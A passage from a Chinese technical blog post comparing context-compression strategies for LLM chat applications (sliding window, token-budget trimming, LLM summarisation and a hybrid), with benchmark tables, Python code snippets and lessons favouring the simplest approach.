<span class="hljs-comment"># - 用户是否抱怨"不记得之前说的"？</span>
<span class="hljs-comment"># - 对话是否经常超过10轮？</span>

<span class="hljs-comment"># 如果是，再升级到混合策略</span>
</code></pre>
<p><strong>2. A/B测试</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 对照组：滑动窗口</span>
group_a = SlidingWindowCompressor(keep_turns=<span class="hljs-number">5</span>)

<span class="hljs-comment"># 实验组：混合策略</span>
group_b = HybridCompressor(llm, threshold_turns=<span class="hljs-number">10</span>)

<span class="hljs-comment"># 观察指标：</span>
<span class="hljs-comment"># - 用户满意度</span>
<span class="hljs-comment"># - 对话完成率</span>
<span class="hljs-comment"># - 重复提问率</span>
<span class="hljs-comment"># - Token成本</span>
</code></pre>
<p><strong>3. 监控关键指标</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MonitoredCompressor</span>:
    <span class="hljs-string">"""带监控的压缩器"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, messages</span>):
        start = time.time()
        
        original_tokens = self._count_tokens(messages)
        result = self.compressor.compress(messages)
        compressed_tokens = self._count_tokens(result)
        
        elapsed = time.time() - start
        
        <span class="hljs-comment"># 记录指标</span>
        metrics.record({
            <span class="hljs-string">"original_tokens"</span>: original_tokens,
            <span class="hljs-string">"compressed_tokens"</span>: compressed_tokens,
            <span class="hljs-string">"compression_rate"</span>: <span class="hljs-number">1</span> - compressed_tokens/original_tokens,
            <span class="hljs-string">"latency_ms"</span>: elapsed * <span class="hljs-number">1000</span>,
            <span class="hljs-string">"strategy"</span>: self.compressor.__class__.__name__
        })
        
        <span class="hljs-keyword">return</span> result
</code></pre>
<p><strong>4. 动态切换策略</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AdaptiveCompressor</span>:
    <span class="hljs-string">"""根据实时情况动态选择策略"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, messages</span>):
        <span class="hljs-comment"># 检查系统负载</span>
        <span class="hljs-keyword">if</span> system_load &gt; <span class="hljs-number">0.8</span>:
            <span class="hljs-comment"># 高负载：用最快的</span>
            <span class="hljs-keyword">return</span> SlidingWindowCompressor().compress(messages)
        
        <span class="hljs-comment"># 检查对话长度</span>
        turns = <span class="hljs-built_in">len</span>(messages) // <span class="hljs-number">2</span>
        <span class="hljs-keyword">if</span> turns &lt;= <span class="hljs-number">10</span>:
            <span class="hljs-keyword">return</span> SlidingWindowCompressor().compress(messages)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> HybridCompressor(llm).compress(messages)
</code></pre>
<hr/>
<h4 data-id="heading-81"><strong>总结：没有银弹</strong></h4>
<pre><code class="hljs language-erlang" lang="erlang">核心教训：
❌ 没有<span class="hljs-string">"最好"</span>的策略
✅ 只有<span class="hljs-string">"最适合"</span>的策略

选择依据：
<span class="hljs-number">1</span>. 对话特征（长度、密度）
<span class="hljs-number">2</span>. 业务需求（成本、体验）
<span class="hljs-number">3</span>. 技术约束（延迟、Token限制）

实用建议：
• <span class="hljs-number">80</span><span class="hljs-comment">%场景：滑动窗口 或 混合策略</span>
• <span class="hljs-number">10</span><span class="hljs-comment">%场景：Token动态</span>
• <span class="hljs-number">10</span><span class="hljs-comment">%场景：LLM摘要</span>

核心原则：
从简单开始 → 测试验证 → 按需升级
</code></pre>
<h2 data-id="heading-82"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df584483d97446c9ba00c68cdcdc4d9f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQWdlbnRCdWlsZGVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765471478&amp;x-signature=6NH6AeDbh8vyJp9HAKDK9LN%2B684%3D" alt="image.png" loading="lazy"/></h2>
<h2 data-id="heading-83"><strong>四、性能测试中的意外发现</strong></h2>
<p>在完成所有测试后，我们发现了一些<strong>反直觉</strong>的结果。这些发现改变了我们对"好策略"的认知。</p>
<h3 data-id="heading-84"><strong>4.1 意外1：LLM摘要在短对话中是"负优化"</strong></h3>
<h4 data-id="heading-85"><strong>直觉预期</strong></h4>
<pre><code class="hljs">LLM很智能 → 压缩效果应该最好
智能摘要 → Token肯定比原始少
</code></pre>
<h4 data-id="heading-86"><strong>实测数据</strong></h4>
<p><strong>短对话（5轮，126 tokens）：</strong></p>
<pre><code class="hljs language-vbnet" lang="vbnet">原始对话：
<span class="hljs-symbol">User:</span> <span class="hljs-string">"我叫Tom"</span>
<span class="hljs-symbol">AI:</span> <span class="hljs-string">"你好Tom！"</span>
<span class="hljs-symbol">User:</span> <span class="hljs-string">"我在上海"</span>
<span class="hljs-symbol">AI:</span> <span class="hljs-string">"上海很不错"</span>
<span class="hljs-symbol">User:</span> <span class="hljs-string">"谢谢"</span>
<span class="hljs-symbol">AI:</span> <span class="hljs-string">"不客气"</span>

总计：<span class="hljs-number">126</span> tokens
</code></pre>
<p><strong>LLM摘要后：</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">📝 对话历史摘要：

<span class="hljs-strong">**用户基本信息**</span>
<span class="hljs-bullet">-</span> 姓名：Tom
<span class="hljs-bullet">-</span> 地点：上海
<span class="hljs-bullet">-</span> 职业：未明确说明

<span class="hljs-strong">**用户偏好和兴趣**</span>
<span class="hljs-bullet">-</span> 未提及具体偏好

<span class="hljs-strong">**讨论主要话题**</span>
<span class="hljs-bullet">1.</span> 用户自我介绍（姓名、地点）
<span class="hljs-bullet">2.</span> 简单寒暄

<span class="hljs-strong">**关键细节**</span>
<span class="hljs-bullet">-</span> 用户表达了感谢

总计：303 tokens（增加141%！）
</code></pre>
<p><strong>结果对比：</strong></p>



































<table><thead><tr><th>对话长度</th><th>原始Token</th><th>LLM摘要后</th><th>变化</th></tr></thead><tbody><tr><td>5轮</td><td>126</td><td>303</td><td><strong>+141%</strong> ❌</td></tr><tr><td>10轮</td><td>249</td><td>388</td><td><strong>+56%</strong> ❌</td></tr><tr><td>20轮</td><td>560</td><td>597</td><td><strong>+7%</strong> ❌</td></tr><tr><td>30轮</td><td>933</td><td>621</td><td><strong>-33%</strong> ✅</td></tr></tbody></table>
<p><strong>震惊的发现：只有≥30轮时，LLM摘要才有正收益！</strong></p>
<hr/>
<h4 data-id="heading-87"><strong>为什么会这样？</strong></h4>
<p><strong>原因1：格式化文本的开销</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 我们的Prompt要求</span>
<span class="hljs-string">"请按以下格式输出摘要：
📝 对话历史摘要：
1. **用户基本信息**：...
2. **用户偏好与兴趣**：...
..."</span>

<span class="hljs-comment"># 这些格式文本本身就消耗Token</span>
格式开销：~<span class="hljs-number">100</span> tokens
</code></pre>
<p><strong>原因2：LLM天生"啰嗦"</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">原始：<span class="hljs-string">"我叫Tom"</span>（<span class="hljs-number">3</span> tokens）

LLM摘要：<span class="hljs-string">"用户的姓名是Tom"</span>（<span class="hljs-number">7</span> tokens）
→ 反而更多！
</code></pre>
<p><strong>原因3：短对话本身已经很简洁</strong></p>
<pre><code class="hljs language-diff" lang="diff">短对话特点：
<span class="hljs-deletion">- 用户说话简短："嗯"、"好的"</span>
<span class="hljs-deletion">- 没有冗余信息</span>
<span class="hljs-deletion">- 本身就是"压缩"过的</span>

LLM摘要：
<span class="hljs-deletion">- 需要完整描述上下文</span>
<span class="hljs-deletion">- 必须保持语义清晰</span>
<span class="hljs-deletion">- 结果反而更长</span>
</code></pre>
<hr/>
<h4 data-id="heading-88"><strong>教训</strong></h4>
<pre><code class="hljs language-arduino" lang="arduino">❌ 错误想法：LLM很智能 → 一定比简单策略好
✅ 正确认知：智能不等于高效，要看具体场景

启示：
• 不要在短对话（&lt;<span class="hljs-number">20</span>轮）使用LLM摘要
• 简单场景用简单方案（滑动窗口）
• <span class="hljs-string">"智能"</span>不是万能的
</code></pre>
<h2 data-id="heading-89"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f6b06ea7ef964e4090529d9ab8596c52~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQWdlbnRCdWlsZGVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765471478&amp;x-signature=RoLfvQvyFFocquLJE1Hdf7ofMwo%3D" alt="image.png" loading="lazy"/></h2>
<h3 data-id="heading-90"><strong>4.2 意外2：混合策略在长对话时Token效率反而很差</strong></h3>
<h4 data-id="heading-91"><strong>直觉预期</strong></h4>
<pre><code class="hljs">混合策略 = 最佳策略
短对话用滑动窗口（快）+ 长对话用LLM（智能）
→ 应该综合了两者优点
</code></pre>
<h4 data-id="heading-92"><strong>实测数据</strong></h4>
<p><strong>长对话（20轮，560 tokens）：</strong></p>






























<table><thead><tr><th>策略</th><th>Token</th><th>相对滑动窗口</th></tr></thead><tbody><tr><td>滑动窗口</td><td><strong>145</strong></td><td>基准</td></tr><tr><td>Token动态</td><td>193</td><td>+33%</td></tr><tr><td>LLM摘要</td><td>597</td><td>+312% ❌</td></tr><tr><td><strong>混合策略</strong></td><td><strong>604</strong></td><td><strong>+317%</strong> ❌</td></tr></tbody></table>
<p><strong>混合策略居然比LLM摘要还差！</strong></p>
<hr/>
<h4 data-id="heading-93"><strong>为什么会这样？</strong></h4>
<p><strong>原因：混合策略保留了更多最近消息</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># LLM摘要配置</span>
keep_recent_turns = <span class="hljs-number">3</span>  <span class="hljs-comment"># 保留3轮 = 6条消息</span>

<span class="hljs-comment"># 混合策略配置</span>
keep_recent_turns = <span class="hljs-number">5</span>  <span class="hljs-comment"># 保留5轮 = 10条消息</span>

结果：
- LLM摘要：<span class="hljs-number">1</span>条摘要 + <span class="hljs-number">6</span>条消息 = <span class="hljs-number">7</span>条（<span class="hljs-number">597</span> tokens）
- 混合策略：<span class="hljs-number">1</span>条摘要 + <span class="hljs-number">10</span>条消息 = <span class="hljs-number">11</span>条（<span class="hljs-number">604</span> tokens）
</code></pre>
<p><strong>对比滑动窗口：</strong></p>
<pre><code class="hljs">滑动窗口：10条最新消息 = 145 tokens
混合策略：1摘要 + 10条 = 604 tokens

Token差距：4.2倍！
</code></pre>
<hr/>
<h4 data-id="heading-94"><strong>深层原因：摘要本身就很"胖"</strong></h4>
<pre><code class="hljs language-erlang" lang="erlang">摘要示例（<span class="hljs-number">200</span>+ tokens）：
<span class="hljs-string">"📝 对话历史摘要：
用户Tom，28岁，在上海浦东工作，
是AI工程师，目前研究Agent多智能体协作，
关注通信延迟和消息队列优化..."</span>

vs 原始对话（<span class="hljs-number">100</span> tokens）：
<span class="hljs-string">"我叫Tom"</span>
<span class="hljs-string">"我在上海"</span>
<span class="hljs-string">"我是AI工程师"</span>
<span class="hljs-string">"我在研究Agent"</span>
...

结果：摘要<span class="hljs-number">200</span> tokens &gt; 原始<span class="hljs-number">100</span> tokens
</code></pre>
<hr/>
<h4 data-id="heading-95"><strong>教训</strong></h4>
<pre><code class="hljs language-arduino" lang="arduino">❌ 错误想法：混合策略综合优点 → 一定最好
✅ 正确认知：综合策略可能综合了缺点

启示：
• 混合策略牺牲Token效率，换取信息保留
• 如果追求Token最少 → 用滑动窗口
• 如果追求信息保留 → 用混合策略
• 不存在<span class="hljs-string">"两全其美"</span>
</code></pre>
<hr/>
<h3 data-id="heading-96"><strong>4.3 意外3：Token动态"精确控制"是把双刃剑</strong></h3>
<h4 data-id="heading-97"><strong>直觉预期</strong></h4>
<pre><code class="hljs">精确控制Token → 充分利用预算
预算200 → 实际193
→ 应该比滑动窗口更高效
</code></pre>
<h4 data-id="heading-98"><strong>实测数据</strong></h4>
<p><strong>中等对话（10轮，249 tokens）：</strong></p>




















<table><thead><tr><th>策略</th><th>Token</th><th>消息数</th></tr></thead><tbody><tr><td>滑动窗口</td><td><strong>123</strong></td><td>10条</td></tr><tr><td>Token动态(预算200)</td><td>194</td><td>15条</td></tr></tbody></table>
<p><strong>Token动态反而多用58%！</strong></p>
<hr/>
<h4 data-id="heading-99"><strong>为什么会这样？</strong></h4>
<p><strong>滑动窗口："省着用"</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 固定保留10条（5轮）</span>
<span class="hljs-comment"># 不管还有多少预算</span>
messages[-<span class="hljs-number">10</span>:]  <span class="hljs-comment"># 123 tokens</span>

剩余预算：<span class="hljs-number">200</span> - <span class="hljs-number">123</span> = <span class="hljs-number">77</span> tokens（浪费）
</code></pre>
<p><strong>Token动态："用满预算"</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 尽量用满200预算</span>
<span class="hljs-comment"># 从后往前累加到接近200</span>
messages[-<span class="hljs-number">15</span>:]  <span class="hljs-comment"># 194 tokens</span>

剩余预算：<span class="hljs-number">200</span> - <span class="hljs-number">194</span> = <span class="hljs-number">6</span> tokens（充分利用）
</code></pre>
<hr/>
<h4 data-id="heading-100"><strong>看似合理，实则矛盾</strong></h4>
<pre><code class="hljs language-erlang" lang="erlang">Token动态的<span class="hljs-string">"优势"</span>：
✅ 充分利用预算（<span class="hljs-number">194</span>/<span class="hljs-number">200</span> = <span class="hljs-number">97</span><span class="hljs-comment">%利用率）</span>
✅ 保留更多消息（<span class="hljs-number">15</span>条 vs <span class="hljs-number">10</span>条）

但从另一个角度：
❌ 用更多Token（<span class="hljs-number">194</span> vs <span class="hljs-number">123</span>）
❌ 后续对话成本更高

问题：
<span class="hljs-string">"充分利用预算"</span>到底是优势还是劣势？
</code></pre>
<p><strong>答案：看你的目标！</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">如果目标是<span class="hljs-string">"充分利用4K上下文窗口"</span>：
→ Token动态是优势 ✅

如果目标是<span class="hljs-string">"尽量节省Token成本"</span>：
→ Token动态是劣势 ❌
</code></pre>
<hr/>
<h4 data-id="heading-101"><strong>教训</strong></h4>
<pre><code class="hljs language-arduino" lang="arduino">❌ 错误想法：精确控制 = 更好
✅ 正确认知：精确控制是工具，不是目标

启示：
• 明确目标：节省成本 <span class="hljs-keyword">or</span> 充分利用？
• Token动态适合<span class="hljs-string">"必须用满预算"</span>的场景
• 如果追求极致压缩 → 用滑动窗口
</code></pre>
<hr/>
<h3 data-id="heading-102"><strong>4.4 意外4：List vs Deque的性能差异微乎其微</strong></h3>
<h4 data-id="heading-103"><strong>直觉预期</strong></h4>
<pre><code class="hljs language-scss" lang="scss">计算机科学理论：
- List<span class="hljs-selector-class">.pop</span>(<span class="hljs-number">0</span>) = <span class="hljs-built_in">O</span>(n)
- Deque<span class="hljs-selector-class">.popleft</span>() = <span class="hljs-built_in">O</span>(<span class="hljs-number">1</span>)

Deque应该快很多！
</code></pre>
<h4 data-id="heading-104"><strong>实测数据</strong></h4>
<p><strong>100,000次操作：</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">List:  13.63ms  (0.14μs/次)</span>
<span class="hljs-section">Deque: 12.52ms  (0.13μs/次)</span>

速度差异：8%
</code></pre>
<p><strong>震惊：几乎一样快！</strong></p>
<hr/>
<h4 data-id="heading-105"><strong>为什么会这样？</strong></h4>
<p><strong>原因1：操作次数少</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 实际使用</span>
messages.pop(<span class="hljs-number">0</span>)  <span class="hljs-comment"># 只删1条</span>

<span class="hljs-comment"># 不是</span>
<span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):
    messages.pop(<span class="hljs-number">0</span>)  <span class="hljs-comment"># 删1000条</span>
</code></pre>
<p>单次删除，O(n)和O(1)差异不大。</p>
<p><strong>原因2：消息列表不长</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 实际场景</span>
messages = [...]  <span class="hljs-comment"># 10-20条</span>

<span class="hljs-comment"># 不是</span>
messages = [...]  <span class="hljs-comment"># 10,000条</span>
</code></pre>
<p>n很小时，O(n)≈O(1)。</p>
<p><strong>原因3：Python内部优化</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># CPython对list.pop(0)有优化</span>
<span class="hljs-comment"># 不是naive的内存移动</span>
</code></pre>
<hr/>
<h4 data-id="heading-106"><strong>教训</strong></h4>
<pre><code class="hljs language-scss" lang="scss">❌ 错误想法：理论复杂度 = 实际性能
✅ 正确认知：要测试实际场景

启示：
• 不要过早优化
• 小数据量时，<span class="hljs-built_in">O</span>(n)和<span class="hljs-built_in">O</span>(<span class="hljs-number">1</span>)差异不大
• 理论是指导，实测才是真相
• List够用，不需要Deque
</code></pre>
<hr/>
<h3 data-id="heading-107"><strong>4.5 意外5："更智能"不等于"更好"</strong></h3>
<h4 data-id="heading-108"><strong>直觉预期</strong></h4>
<pre><code class="hljs">智能排序：
LLM摘要 &gt; 混合策略 &gt; Token动态 &gt; 滑动窗口

实际效果应该也是这个顺序
</code></pre>
<h4 data-id="heading-109"><strong>实测数据汇总</strong></h4>








































<table><thead><tr><th>维度</th><th>第1名</th><th>第2名</th><th>第3名</th><th>第4名</th></tr></thead><tbody><tr><td><strong>Token效率</strong></td><td>滑动窗口</td><td>Token动态</td><td>混合策略</td><td>LLM摘要</td></tr><tr><td><strong>速度</strong></td><td>滑动窗口</td><td>Token动态</td><td>混合策略</td><td>LLM摘要</td></tr><tr><td><strong>成本</strong></td><td>滑动窗口</td><td>Token动态</td><td>混合策略</td><td>LLM摘要</td></tr><tr><td><strong>简单性</strong></td><td>滑动窗口</td><td>Token动态</td><td>LLM摘要</td><td>混合策略</td></tr></tbody></table>
<p><strong>最"蠢"的策略（滑动窗口）在4个维度都第一！</strong></p>
<p><strong>只有"信息保留"一个维度：</strong></p>



















<table><thead><tr><th>维度</th><th>第1名</th><th>第2名</th><th>第3名</th><th>第4名</th></tr></thead><tbody><tr><td><strong>信息保留</strong></td><td>LLM摘要</td><td>混合策略</td><td>Token动态</td><td>滑动窗口</td></tr></tbody></table>
<hr/>
<h4 data-id="heading-110"><strong>为什么会这样？</strong></h4>
<p><strong>复杂度诅咒：</strong></p>
<pre><code class="hljs language-diff" lang="diff">滑动窗口：
<span class="hljs-deletion">- 简单 → 快</span>
<span class="hljs-deletion">- 简单 → 省Token</span>
<span class="hljs-deletion">- 简单 → 便宜</span>
<span class="hljs-deletion">- 简单 → 可靠</span>

LLM摘要：
<span class="hljs-deletion">- 复杂 → 慢</span>
<span class="hljs-deletion">- 复杂 → 费Token</span>
<span class="hljs-deletion">- 复杂 → 贵</span>
<span class="hljs-deletion">- 复杂 → 可能出错</span>
</code></pre>
<p><strong>智能的代价：</strong></p>
<pre><code class="hljs language-diff" lang="diff">获得：100%信息保留
付出：
<span class="hljs-deletion">- 速度慢29,000倍</span>
<span class="hljs-deletion">- Token多4倍</span>
<span class="hljs-deletion">- 成本$0.0001/次</span>
<span class="hljs-deletion">- 系统复杂度↑</span>

问题：这个trade-off值得吗？
</code></pre>
<p><strong>答案：看场景</strong></p>
<pre><code class="hljs language-erlang" lang="erlang">短对话（<span class="hljs-number">80</span><span class="hljs-comment">%场景）：</span>
→ 不值得，信息本来就不会丢

长对话（<span class="hljs-number">20</span><span class="hljs-comment">%场景）：</span>
→ 值得，用户体验提升明显
</code></pre>
<hr/>
<h4 data-id="heading-111"><strong>教训</strong></h4>
<pre><code class="hljs language-erlang" lang="erlang">❌ 错误想法：智能 = 好
✅ 正确认知：简单 = 好（大多数场景）

启示：
• <span class="hljs-number">80</span><span class="hljs-comment">%场景用滑动窗口就够了</span>
• <span class="hljs-number">20</span><span class="hljs-comment">%场景才需要"智能"策略</span>
• 不要为了<span class="hljs-string">"智能"</span>而牺牲效率
• Keep It Simple, Stupid (KISS原则)
</code></pre>
<hr/>
<h3 data-id="heading-112"><strong>4.6 最震撼的发现：上下文越长，效率越低</strong></h3>
<h4 data-id="heading-113"><strong>实测数据</strong></h4>



































<table><thead><tr><th>对话长度</th><th>滑动窗口Token</th><th>Token动态Token</th><th>比例</th></tr></thead><tbody><tr><td>5轮(126)</td><td>126</td><td>126</td><td>1.0x</td></tr><tr><td>10轮(249)</td><td>123</td><td>194</td><td>1.6x</td></tr><tr><td>20轮(560)</td><td>145</td><td>193</td><td>1.3x</td></tr><tr><td>30轮(933)</td><td>144</td><td>191</td><td>1.3x</td></tr></tbody></table>
<p><strong>关键发现：</strong></p>
<pre><code class="hljs language-diff" lang="diff">对话越长：
<span class="hljs-deletion">- 绝对Token数差异不大（144-145 vs 191-193）</span>
<span class="hljs-deletion">- 但滑动窗口压缩率越高（85% vs 80%）</span>
<span class="hljs-deletion">- Token动态优势消失</span>
</code></pre>
<p><strong>矛盾之处：</strong></p>
<pre><code class="hljs language-erlang" lang="erlang">Token动态设计目标：长对话时充分利用预算
实际结果：长对话时优势反而不明显

滑动窗口设计目标：简单固定保留
实际结果：长对话时压缩效果最好（<span class="hljs-number">85</span><span class="hljs-comment">%）</span>
</code></pre>
<hr/>
<h4 data-id="heading-114"><strong>为什么会这样？</strong></h4>
<p><strong>滑动窗口的"顿悟时刻"：</strong></p>
<pre><code class="hljs language-erlang" lang="erlang"><span class="hljs-number">5</span>轮 → <span class="hljs-number">10</span>轮：新增<span class="hljs-number">5</span>轮，需要压缩
压缩率：<span class="hljs-number">0</span><span class="hljs-comment">% → 51%</span>

<span class="hljs-number">10</span>轮 → <span class="hljs-number">20</span>轮：新增<span class="hljs-number">10</span>轮，需要大量压缩
压缩率：<span class="hljs-number">51</span><span class="hljs-comment">% → 74%</span>

<span class="hljs-number">20</span>轮 → <span class="hljs-number">30</span>轮：新增<span class="hljs-number">10</span>轮，继续压缩
压缩率：<span class="hljs-number">74</span><span class="hljs-comment">% → 85%</span>

结论：对话越长，滑动窗口压缩效率越高
</code></pre>
<p><strong>Token动态的"天花板"：</strong></p>
<pre><code class="hljs language-diff" lang="diff">预算200固定：
<span class="hljs-deletion">- 10轮(249) → 194 tokens（少55）</span>
<span class="hljs-deletion">- 20轮(560) → 193 tokens（少367）</span>
<span class="hljs-deletion">- 30轮(933) → 191 tokens（少742）</span>

绝对压缩量：55 → 367 → 742 ↑
压缩率：22% → 66% → 80% ↑

但始终被"200预算"限制
</code></pre>
<p><strong>结论：预算是Token动态的天花板</strong></p>
<hr/>
<h4 data-id="heading-115"><strong>教训</strong></h4>
<pre><code class="hljs">❌ 错误想法：复杂场景需要复杂方案
✅ 正确认知：简单方案对付复杂场景可能更有效

启示：
• 对话越长，滑动窗口优势越大
• Token动态受预算天花板限制
• 不要低估简单方案的潜力
</code></pre>
<hr/>
<h3 data-id="heading-116"><strong>4.7 核心教训：Trade-off无处不在</strong></h3>
<p>通过完整测试，我们发现：<strong>不存在"完美"的策略。</strong></p>
<h4 data-id="heading-117"><strong>四个核心Trade-off</strong></h4>
<p><strong>1. Token效率 ↔ 信息保留</strong></p>
<pre><code class="hljs language-diff" lang="diff">滑动窗口：
<span class="hljs-deletion">- Token最少（145）</span>
<span class="hljs-deletion">- 信息保留0%</span>

LLM摘要：
<span class="hljs-deletion">- Token很多（597）</span>
<span class="hljs-deletion">- 信息保留100%</span>

无法同时优化
</code></pre>
<hr/>
<p><strong>2. 速度 ↔ 智能</strong></p>
<pre><code class="hljs language-diff" lang="diff">滑动窗口：
<span class="hljs-deletion">- 速度最快（0.00ms）</span>
<span class="hljs-deletion">- 不智能（机械删除）</span>

LLM摘要：
<span class="hljs-deletion">- 速度最慢（11,000ms）</span>
<span class="hljs-deletion">- 最智能（理解语义）</span>

无法同时优化
</code></pre>
<hr/>
<p><strong>3. 成本 ↔ 质量</strong></p>
<pre><code class="hljs language-diff" lang="diff">滑动窗口：
<span class="hljs-deletion">- 零成本</span>
<span class="hljs-deletion">- 可能丢失信息</span>

LLM摘要：
<span class="hljs-deletion">- 有成本（$0.0001/次）</span>
<span class="hljs-deletion">- 保留完整信息</span>

无法同时优化
</code></pre>
<hr/>
<p><strong>4. 简单 ↔ 灵活</strong></p>
<pre><code class="hljs language-diff" lang="diff">滑动窗口：
<span class="hljs-deletion">- 极简（3行代码）</span>
<span class="hljs-deletion">- 不灵活（固定轮数）</span>

混合策略：
<span class="hljs-deletion">- 复杂（50行代码）</span>
<span class="hljs-deletion">- 灵活（自动适应）</span>

无法同时优化
</code></pre>
<hr/>
<h4 data-id="heading-118"><strong>工程中的智慧</strong></h4>
<pre><code class="hljs language-arduino" lang="arduino">理想主义者：
<span class="hljs-string">"我要一个策略，Token少、速度快、成本低、
 信息保留好、还简单易用！"</span>

现实：
<span class="hljs-string">"不存在这样的策略。"</span>

工程师的选择：
<span class="hljs-string">"我要在Token效率和信息保留之间找平衡。"</span>
→ 选择混合策略

<span class="hljs-string">"我要在速度和成本之间找平衡。"</span>
→ 选择滑动窗口

<span class="hljs-string">"我要在简单和灵活之间找平衡。"</span>
→ 选择Token动态
</code></pre>
<hr/>
<h3 data-id="heading-119"><strong>4.8 反直觉结论总结</strong></h3>



































<table><thead><tr><th>直觉想法</th><th>实测结果</th><th>原因</th></tr></thead><tbody><tr><td>LLM摘要效率最高</td><td>短对话反而更差</td><td>格式开销+LLM啰嗦</td></tr><tr><td>混合策略综合优点</td><td>长对话Token多4倍</td><td>摘要本身很"胖"</td></tr><tr><td>Token动态更节省</td><td>比滑动窗口多58%</td><td>尽量用满预算</td></tr><tr><td>Deque比List快很多</td><td>只快8%</td><td>实际操作次数少</td></tr><tr><td>智能策略更好</td><td>滑动窗口多维度第一</td><td>简单=快=省=可靠</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-120"><strong>4.9 最终建议：从简单开始</strong></h3>
<p>基于所有测试数据，我们的<strong>最终建议</strong>：</p>
<h4 data-id="heading-121"><strong>第一阶段：用滑动窗口（80%场景）</strong></h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 最简单的方案</span>
compressor = SlidingWindowCompressor(keep_turns=<span class="hljs-number">5</span>)

优点：
✅ <span class="hljs-number">3</span>行代码
✅ 零成本
✅ 最快
✅ Token最少
✅ 可靠

适用：
• 短对话（≤<span class="hljs-number">10</span>轮）
• 成本敏感
• 实时场景
• 初期MVP
</code></pre>
<hr/>
<h4 data-id="heading-122"><strong>第二阶段：发现问题后升级</strong></h4>
<p><strong>观察指标：</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> 用户是否抱怨"不记得之前说的"？
<span class="hljs-bullet">2.</span> 对话是否经常超过10轮？
<span class="hljs-bullet">3.</span> 是否有关键信息丢失？
<span class="hljs-bullet">4.</span> 用户是否需要重复信息？
</code></pre>
<p><strong>如果是，考虑升级到混合策略：</strong></p>
<pre><code class="hljs language-python" lang="python">compressor = HybridCompressor(
    llm,
    threshold_turns=<span class="hljs-number">10</span>,
    keep_recent_turns=<span class="hljs-number">5</span>
)

优点：
✅ 短对话保持滑动窗口速度
✅ 长对话保留用户信息
✅ 自动适应

缺点：
❌ 长对话Token多<span class="hljs-number">4</span>倍
❌ 有成本
❌ 速度慢（长对话时）
</code></pre>
<hr/>
<h4 data-id="heading-123"><strong>第三阶段：特殊场景使用专用策略</strong></h4>
<p><strong>场景1：有Token严格限制</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 用Token动态</span>
compressor = TokenBasedCompressor(
    llm.count_tokens,
    max_tokens=<span class="hljs-number">200</span>
)
</code></pre>
<p><strong>场景2：超长对话（≥30轮）</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 用LLM摘要</span>
compressor = LLMSummaryCompressor(
    llm,
    keep_recent_turns=<span class="hljs-number">3</span>
)
</code></pre>
<h2 data-id="heading-124"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5287175b78ce44a2875ec6c1e15ca357~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQWdlbnRCdWlsZGVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765471478&amp;x-signature=D0DQJPG1rLkPwRWnYjuxTdIOzHQ%3D" alt="image.png" loading="lazy"/></h2>
<h3 data-id="heading-125"><strong>4.10 写在最后：测试的价值</strong></h3>
<p>如果我们没有做这些测试，会有什么后果？</p>
<p><strong>可能的错误决策：</strong></p>
<pre><code class="hljs language-erlang" lang="erlang">❌ <span class="hljs-string">"LLM摘要最智能，全部用它！"</span>
   → 短对话Token增加<span class="hljs-number">141</span><span class="hljs-comment">%，成本暴涨</span>

❌ <span class="hljs-string">"混合策略综合优点，就用它！"</span>
   → 没意识到Token多<span class="hljs-number">4</span>倍，成本超预算

❌ <span class="hljs-string">"Token动态精确控制，最优！"</span>
   → 没意识到比滑动窗口多用<span class="hljs-number">58</span><span class="hljs-comment">% Token</span>

❌ <span class="hljs-string">"Deque比List快，必须用Deque！"</span>
   → 花时间重构，实际只快<span class="hljs-number">8</span><span class="hljs-comment">%</span>
</code></pre>
<p><strong>测试的价值：</strong></p>
<pre><code class="hljs language-vbnet" lang="vbnet">✅ 避免基于<span class="hljs-string">"直觉"</span>的错误决策
✅ 发现反直觉的真相
✅ 量化Trade-<span class="hljs-keyword">off</span>
✅ 找到适合场景的最优解
</code></pre>
<hr/>
<h3 data-id="heading-126"><strong>4.11 关键数据速查表</strong></h3>
<p>为了方便查阅，这里汇总所有关键测试数据：</p>
<h4 data-id="heading-127"><strong>压缩效率（长对话20轮，560 tokens）</strong></h4>













































